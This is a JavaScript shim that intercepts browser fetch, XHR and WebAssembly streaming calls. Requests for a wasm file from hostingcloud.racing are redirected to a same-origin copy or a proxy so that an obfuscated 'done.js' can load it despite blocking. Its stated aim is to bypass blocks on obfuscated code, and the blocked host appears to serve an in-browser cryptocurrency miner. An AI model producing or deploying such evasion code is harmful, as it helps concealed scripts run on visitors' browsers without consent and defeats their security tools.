/* wasm-override.js
   Runtime interception for .wasm requests to hostingcloud.racing/wPxSCaJj.wasm
   - Include this BEFORE done.js so obfuscated code's fetch/XHR calls get redirected.
   - Configure window.WasmBypassConfig below if needed.
*/

(function(){
  const DEFAULT = {
    hostMatch: "hostingcloud.racing",
    pathSubstr: "wPxSCaJj.wasm",
    sameOrigin: "/wPxSCaJj.wasm", // set to null if not using same-origin copy
    proxy: "" // e.g. "https://your-worker.workers.dev/work?u="  (will append encodeURIComponent(originalUrl))
  };

  const C = Object.assign({}, DEFAULT, window.WasmBypassConfig || {});

  function shouldReplace(url) {
    try {
      const u = new URL(url, location.href);
      return (u.hostname && u.hostname.includes(C.hostMatch)) || (u.pathname && u.pathname.includes(C.pathSubstr));
    } catch (e) {
      // if cannot parse, do a simple substring check
      return String(url).includes(C.hostMatch) || String(url).includes(C.pathSubstr);
    }
  }

  function makeReplacementUrl(original) {
    if (C.sameOrigin) return new URL(C.sameOrigin, location.origin).toString();
    if (C.proxy) return C.proxy + encodeURIComponent(original);
    return original; // fallback: no change
  }

  // --- override fetch ---
  const _fetch = window.fetch.bind(window);
  window.fetch = function(input, init) {
    try {
      let url = (typeof input === "string") ? input : (input && input.url) || input;
      if (url && shouldReplace(url)) {
        const newUrl = makeReplacementUrl(url);
        // if input is a Request object, clone and replace url
        if (typeof input === "object" && input instanceof Request) {
          const newReq = new Request(newUrl, {
            method: input.method,
            headers: input.headers,
            body: input.body,
            mode: input.mode,
            credentials: input.credentials,
            cache: input.cache,
            redirect: input.redirect,
            referrer: input.referrer,
            integrity: input.integrity,
            keepalive: input.keepalive,
            signal: input.signal
          });
          return _fetch(newReq, init);
        } else {
          return _fetch(newUrl, init);
        }
      }
    } catch (e) {
      // ignore and fall through to default
    }
    return _fetch(input, init);
  };

  // --- override XMLHttpRequest open/send (in case done.js uses XHR) ---
  try {
    const XHRProto = XMLHttpRequest.prototype;
    const _open = XHRProto.open;
    XHRProto.open = function(method, url /* ...rest */) {
      try {
        if (shouldReplace(url)) {
          const newUrl = makeReplacementUrl(url);
          arguments[1] = newUrl;
        }
      } catch(e){}
      return _open.apply(this, arguments);
    };
  } catch(e){ /* ignore on very locked environments */ }

  // --- override WebAssembly.instantiateStreaming to handle direct Response inputs ---
  if (window.WebAssembly && window.WebAssembly.instantiateStreaming) {
    const _instStream = WebAssembly.instantiateStreaming.bind(WebAssembly);
    window.WebAssembly.instantiateStreaming = async function(respOrPromise, importObject) {
      try {
        // if respOrPromise is a Promise (eg: fetch(...)) we can inspect its resolved value
        const maybeResp = await Promise.resolve(respOrPromise);
        // If maybeResp has a url property and matches, fetch replacement
        if (maybeResp && maybeResp.url && shouldReplace(maybeResp.url)) {
          const replacementUrl = makeReplacementUrl(maybeResp.url);
          const r = await _fetch(replacementUrl);
          return _instStream(r, importObject);
        }
      } catch (e) {
        // fall back
      }
      return _instStream(respOrPromise, importObject);
    };
  }

  // --- override WebAssembly.instantiate (in case binary ArrayBuffer used) ---
  // Many libs do fetch(...).then(r => r.arrayBuffer()).then(buf => WebAssembly.instantiate(buf,...))
  // Our fetch override should already swap the source, so no need to wrap instantiate, but we still
  // provide a safe wrapper that does not change behavior.
  // (Leaving original instantiate intact)

  // --- Small debug helper (optional) ---
  window.__wasmBypass = {
    config: C,
    shouldReplace,
    makeReplacementUrl
  };

  console.info("wasm-override: installed for", C.hostMatch, "-> sameOrigin:", !!C.sameOrigin, " proxy:", !!C.proxy);
})();
